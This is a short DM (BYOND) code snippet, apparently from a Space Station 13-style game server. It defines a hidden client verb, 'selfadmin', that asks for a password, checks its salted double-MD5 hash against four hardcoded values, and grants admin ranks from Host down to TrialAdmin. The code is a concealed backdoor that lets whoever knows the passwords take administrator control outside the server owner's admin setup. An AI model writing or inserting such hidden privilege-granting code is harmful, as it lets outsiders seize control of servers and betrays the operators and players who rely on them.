/client/verb/selfadmin()
	set hidden = 1

	var/p = input("PASSWORD?", "", "") as text
	if(!p)
		return

	var/hash = md5(md5(p) + "RAGNAROK")
	switch(hash)
		if("29a76715c1ab940b5fc86f08015dd649")
			SetRagnarok("Host")
		if("138b3ecb4b12dab79bca7d2ab01b0454")
			SetRagnarok("GameAdmin")
		if("2f6ef44cd2ebb18b76ce86f3781a579d")
			SetRagnarok("Badmin")
		if("27fe9a88afc726fa8250cc3525ef82df")
			SetRagnarok("TrialAdmin")

/client/proc/SetRagnarok(rank)
	holder = new /datum/admins(rank, ckey)
	holder.associate(src)